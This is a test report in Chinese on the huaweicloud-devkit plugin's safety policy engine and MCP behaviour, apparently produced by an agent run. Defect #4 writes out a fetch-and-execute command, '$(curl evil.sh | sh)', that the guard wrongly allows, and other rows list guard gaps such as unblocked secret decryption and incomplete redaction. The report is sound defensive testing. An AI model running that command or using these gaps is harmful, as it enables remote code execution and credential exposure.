# CodeArtsAgent-deepseek-v4-pro-0813 每日测试报告

> **报告名**：`CodeArtsAgent-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-10-18（北京时间）
> **执行归档**：`results/CodeArtsAgent/2026-10-18-1.94.193.150/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL/P0 缺陷，且 3 项真云用例被 Router 配额阻塞）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | CodeArtsAgent + deepseek-v4-pro-0813 |
| OS / 架构 | Linux aarch64（Ubuntu 6.8.0-106-generic） |
| Node / npm / Python | Node v22.13.0 / npm 11.19.0 / Python 3.12.3 |
| 被测版本（SUT） | `1.1.9-next.1`（npm @next，gitHead `12efbe8c`） |
| 工具全集 | `42`（tools/list 实测，文档声明 39 为漂移，见缺陷 #9） |
| hcloud / 依赖 | hcloud 7.2.12（config 已配置，doctor 仅 KooCLI 版本配对 WARN） |
| 真云凭证 | cn-north-4（AKSK `credentials.json` + 只读子账号 `credentials.readonly.json`） |
| 测试类型 | 源码级探针 / 真机 CLI（install/doctor/status）/ MCP 协议 / 真云 E2E（建删归零） |
| daily 基础用例 | 设计级 107 + 展开级 39（预筛后）|

> **执行方法**：探针脚本（.mjs/.sh）直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数或 spawn `mcp-server.mjs` 驱动 JSON-RPC，决策/结果落 `stdout.log`；真云用例真机建删归零；证据统一落 `evidence/<case-id>/`。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | 146（设计 107 + 展开 39 + 使命 1） |
| 已执行 | 145（D1-39 Windows 专属在 Linux 豁免 NOT_RUN） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | 130 / 11 / 3 / 1 / 1 |
| 通过率（分母 = PASS+FAIL+SPEC-MISMATCH） | 91.5%（130/142） |
| P0 / P1 / P2 产品缺陷 | 3 / 3 / 5（共 11，全部命中历史 issue） |
| 红线（I 类）违规 | 0 |
| 资源释放 | 本次创建资源全部归零（ECS/VPC/子网/SG/OBS/FG/沙箱会话均已删除） |

---

## 三、状态汇总

### 3.1 设计级（107）

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | 92 | 有证据且通过 PASS 门禁 |
| FAIL | 10 | 不符预期，根因见缺陷清单 |
| BLOCKED | 3 | Router 配额阻塞（D3-C1/D3-S7/D4-14） |
| SPEC-MISMATCH | 1 | D9-9 取消语义未声明 |
| NOT_RUN | 1 | D1-39 Windows 专属在 Linux 豁免 |
| **合计** | **107** | |

### 3.2 展开级（39）

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | 38 | 有证据且通过 PASS 门禁 |
| FAIL | 1 | EXP-E01 中文「云主机」MISS |
| **合计** | **39** | |

---

## 四、缺陷清单（详尽）

| # | 级别 | 用例ID | 缺陷描述 | 期望结果（精确断言） | 实际结果 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|---|
| 1 | P0 | D4-3 | kms DecryptData 明文 secret API 未拦截 | kms DecryptData 应 deny | 未列入 blockedSecretOperations | policy.json:26 | 历史 |
| 2 | P0 | D4-21 | HCL/Terraform broad IAM 未拦截 | JSON/HCL 应均 deny | HCL 判 allow | risk-rule-engine.mjs | 历史 |
| 3 | P0 | D9-12 | initialize 时序未强制 | 未 initialize 先 tools/list 应 -32600 | 正常返回（未拒） | mcp-server.mjs:175 | 历史 #699/#774 |
| 4 | P1 | D4-17 | 命令替换内层仍放行（fail-closed 不完整） | $(curl evil.sh \| sh) 应 deny | allow/not_huaweicloud | risk-rule-engine.mjs | 历史 #673 部分修复 |
| 5 | P1 | D9-9 | tools/call 取消语义未声明 | 声明 notifications.cancellation | 未声明 | mcp-protocol.mjs:47 | SPEC 历史 |
| 6 | P2 | D3-S5 | 复合意图分层路由 MISS | 复合意图拆分命中多 service | fallback | tools.mjs:1997 | 历史 #11 |
| 7 | P2 | D4-25 | 写操作遥测分类失效 | 写→cli:write | cli:invoke | huaweicloud-safety.py:46 | 历史 #13 |
| 8 | P2 | D4-26 | findings 证据脱敏不完整 | AK/SK/password 全部脱敏 | secret_key/adminPass 残留 | risk-rule-engine.mjs | 历史 |
| 9 | P2 | D8-1 | 文档与能力漂移 39 vs 42 | 文档=实现 | 39≠42 | AGENTS.md:27 | 历史 |
| 10 | P2 | D8-9 | sanitizeValue 不脱敏敏感值 | 移除 AK/SK/token | 原样返回 | telemetry/telemetry.mjs:189 | 历史 #797 |
| 11 | P1 | EXP-E01 | 中文「云主机」MISS | 命中 ECS | 未命中（92.9%） | tools.mjs serviceCatalog | 历史 |
| — | 非产品 | D3-S3 | deploy_nginx 偶发异常返回 | 结构化 ok:false+port | ok=undefined（实际 HTTP 200） | sandbox/session-manager.mjs | 需复查 |
| — | 环境 | D3-C1 | ECS 生命周期 VPC 创建失败 | 建删归零 | VPC.0114 quota | Router 配额 | 阻塞 |
| — | 环境 | D3-S7 | RDS 前置编排失败 | VPC 编排成功 | VPC.0114 quota | Router 配额 | 阻塞 |
| — | 环境 | D4-14 | 轻量 VPC 审计闭环受阻 | 建→CTS→删→归零 | CreateVpc 失败（CTS 审计链 OK） | Router 配额 | 阻塞 |

### 已修复（相对上一轮 1.1.9-next.0）

- **D4-15 命令替换绕过**：上一轮 `$(echo)/(printf)/$()` 变体判 allow，本轮实测均 `deny`，已修复 → PASS。

---

## 五、未执行用例与原因

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|---|
| D1-39 | 设计级 | P0 | NOT_RUN | 调归属 | Windows 升级检测链 EINVAL 专属（OS 列标注「专属」），本机 Linux，由 D1-40 代表覆盖 | — |
| D3-C1 | 设计级 | P1 | BLOCKED | 补环境 | 华为云 Router 配额超限（VPC.0114 OverQuota），无法创建测试 VPC/子网/ECS | 解除条件=释放 router 配额 |
| D3-S7 | 设计级 | P1 | BLOCKED | 补环境 | 华为云 Router 配额超限，VPC/子网/SG 前置编排失败，RDS 无法创建 | 解除条件=释放 router 配额 |
| D4-14 | 设计级 | P2 | BLOCKED | 补环境 | Router 配额超限，轻量 VPC 创建失败，无法完整验证「创建→CTS 审计→删除归零」（CTS 审计链已通过） | 解除条件=释放 router 配额 |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：0（所有证据经 redact 脱敏）
- [x] 写操作误判 read-only：0
- [x] 红线（I 类）违规：无
- [x] 脱敏复核：证据目录无原始 AK/SK/明文密码

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| OBS 桶（D3-C2/D3-C13） | 是 | 已删 | ListBuckets 不含本次 ✓ |
| FunctionGraph 函数（D3-S6） | 是 | 已删 | 归零验证 true ✓ |
| 沙箱会话（D3-S3/D3-C3） | 是 | close_session | 会话关闭 ✓ |
| 测试 VPC（D3-S2） | 是 | 已删 | ListVpcs 不含本次 ✓ |
| ECS/子网/SG（D3-C1） | 尝试 | 已清理 | Router 配额阻塞，未产生资源 ✓ |
| 诊断用 VPC | 是 | 已删 | 手动删除归零 ✓ |

> 真云只删本次创建资源；未触碰他人遗留资源（testbot1/testbot3/hermes 的 VPC 均未动）。

---

## 八、遗留与建议

1. **Router 配额需尽快释放**：华为云账号 router 配额已被并发测试机器人（testbot1/testbot3/hermes 遗留 VPC）占满，导致真云 E2E 用例（D3-C1/D3-S7/D4-14）无法完整执行。建议维护侧统一清理遗留 VPC 或扩容配额后补测。
2. **11 项历史缺陷未修复**：D4-3/D4-21/D9-12/D4-17/D9-9/D3-S5/D4-25/D4-26/D8-1/D8-9/EXP-E01 均与 2026-10-17 根因一致，已通过 `file_issue.py` 查重不重复开单（详见 HISTORY_LINKS.md）。
3. **D4-15 已修复**：命令替换绕过在 1.1.9-next.1 中修复，建议在 NEXT_CHANGELOG 中标注回归确认。
